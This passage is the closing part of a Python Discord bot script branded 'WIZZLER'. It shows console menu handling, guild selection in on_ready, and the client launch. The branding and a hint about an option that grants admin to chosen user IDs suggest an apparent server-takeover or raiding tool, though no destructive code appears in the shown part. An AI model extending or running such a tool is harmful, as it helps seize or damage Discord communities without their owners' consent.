                bot_token_preview = config_data.get("token", "N/A")[:20] + "..."
                max_conc = config_data.get("max_concurrent", "N/A")
                use_proxy = "Yes" if config_data.get("proxy", False) else "No"
                print(gradient_text(f"│ {marker} │ {config_name:<25} │ Token: {bot_token_preview:<27} │ Proxy: {use_proxy:<3} │ MaxConc: {max_conc:<5} │", PINK_START, PINK_END, bold=True))
            print(gradient_text("╰" + "─" * 105 + "╯", PINK_START, PINK_END, bold=True))
            await asyncio.sleep(5)
            await self.menu()
        
        elif ans == "39":
            print(format_log_message("SUCCESS", "Exiting...", 50))
            os._exit(0)
        elif ans == "40":
            await self.execute_guild_info(token)
        elif ans == "41":
            invite_link = __config__.get("operations", {}).get("ouath2")
            if not invite_link:
                print(format_log_message("ERROR", "'ouath2' not found in config's 'operations' section!", 40))
            else:
                platform = await self.async_input(format_log_message("INFO", "Platform: [w]indows (copy) / [m]obile (print)", 50))
                platform = platform.strip().lower()
                
                if platform.startswith('w'):
                    try:
                        pyperclip.copy(invite_link)
                        print(format_log_message("SUCCESS", "Bot invite link copied to clipboard.", 50))
                        print(gradient_text(invite_link, GREEN_START, GREEN_END, bold=True))
                    except Exception as e:
                        print(format_log_message("ERROR", f"Could not copy to clipboard: {e}", 40))
                        print(format_log_message("INFO", f"Here is the link instead: {invite_link}", 50))
                elif platform.startswith('m'):
                    print(format_log_message("SUCCESS", "Bot invite link:", 50))
                    print(gradient_text(invite_link, GREEN_START, GREEN_END, bold=True))
                else:
                    print(format_log_message("INFO", "Invalid choice. Printing link.", 40))
                    print(gradient_text(invite_link, GREEN_START, GREEN_END, bold=True))
            
            await asyncio.sleep(5)
            await self.menu()
        else:
            print(format_log_message("ERROR", f"Invalid option: {gradient_text(ans, PINK_START, PINK_END, bold=True)}!", 47))            

        await asyncio.sleep(10)
        await self.menu()

@__client__.event
async def on_ready():
    global bot_instance
    try:
        os.system("cls") if os.name == "nt" else os.system("clear")
        print(format_log_message("SUCCESS", f"Authenticated: {__client__.user.name}#{__client__.user.discriminator}", 24))

        guildid = ""
        fetch_guilds_choice = await __client__.loop.run_in_executor(None, lambda: input(format_log_message("INFO", "Fetch and list available guilds? [y/n]", 50)))
        fetch_guilds_choice = fetch_guilds_choice.strip().lower()

        if fetch_guilds_choice == 'y' and __client__.guilds:
            print(format_log_message("INFO", "Available Guilds:", 50))
            print(gradient_text("╭" + "─" * 140 + "╮", PINK_START, PINK_END, bold=True))
            for i, guild in enumerate(__client__.guilds):
                print(gradient_text(f"│ {i+1:>3} │ {guild.name:<104} │ ID: {guild.id:<20}  │", PINK_START, PINK_END, bold=True))
            print(gradient_text("╰" + "─" * 140 + "╯", PINK_START, PINK_END, bold=True))
            
            try:
                choice = await __client__.loop.run_in_executor(None, lambda: input(format_log_message("INFO", "Choose guild number (or Enter for manual ID)", 50)))
                choice = choice.strip()
                if choice:
                    idx = int(choice) - 1
                    if 0 <= idx < len(__client__.guilds):
                        guildid = str(__client__.guilds[idx].id)
                        print(format_log_message("SUCCESS", f"Selected: {gradient_text(__client__.guilds[idx].name, PINK_START, PINK_END, bold=True)}", 43))
                    else:
                        raise ValueError
                else:
                    guildid = await __client__.loop.run_in_executor(None, lambda: input(format_log_message("INFO", "Enter Guild ID manually", 50)))
                    guildid = guildid.strip()
            except (ValueError, IndexError):
                print(format_log_message("ERROR", "Invalid choice. Falling back to manual ID input.", 28))
                guildid = await __client__.loop.run_in_executor(None, lambda: input(format_log_message("INFO", "Enter Guild ID", 50)))
                guildid = guildid.strip()
        else:
            if fetch_guilds_choice == 'y':
                print(format_log_message("ERROR", "No guilds found! Proceeding to manual ID input.", 28))
            else:
                print(format_log_message("INFO", "Skipping guild list.", 40))
            guildid = await __client__.loop.run_in_executor(None, lambda: input(format_log_message("INFO", "Enter Guild ID", 50)))
            guildid = guildid.strip()

        if not guildid:
            print(format_log_message("ERROR", "No guild ID provided! Exiting.", 32))
            os._exit(1)

        bot_instance = shakti(guildid, __client__)
        print(format_log_message("INFO", "Use option 26 to grant admin to specific user IDs.", 40))
        await bot_instance.menu()
    except KeyboardInterrupt:
        os.system("cls") if os.name == "nt" else os.system("clear")
        print(format_log_message("INFO", "Closing WIZZLER... Goodbye!", 40))
        await asyncio.sleep(0.5)
        exit(0)
        
if __name__ == "__main__":
     try:
        if os.name == "nt":
            os.system(f"title Wizzlers On Top")
        __client__.run(token)
     except KeyboardInterrupt:
        print(format_log_message("INFO", "Closing WIZZLER... Goodbye!", 40))
        os._exit(0)
     except Exception as e:
        print(format_log_message("ERROR", f"Failed to start | {e}", 47))
        os._exit(1)